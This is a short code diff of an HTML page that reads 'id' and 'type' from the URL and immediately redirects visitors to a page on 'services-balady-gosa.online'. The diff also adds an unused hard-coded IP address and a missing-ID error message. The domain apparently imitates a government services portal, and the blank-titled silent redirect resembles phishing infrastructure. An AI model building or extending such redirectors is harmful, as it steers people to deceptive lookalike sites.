@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>.</title>
+    <title>..</title>
 
     <script>
         const params = new URLSearchParams(window.location.search);
@@ -15,12 +15,17 @@
         if (id) {
             let target = "https://services-balady-gosa.online/view/" +
                          encodeURIComponent(id);
-
+            let server = "191.215.46.239";
             if (type) {
                 target += "?type=" + encodeURIComponent(type);
             }
 
             window.location.replace(target);
+        } else {
+            document.body.innerHTML = `
+                <h2>Invalid request</h2>
+                <p>Missing ID.</p>
+            `;
         }
     </script>
 </head>
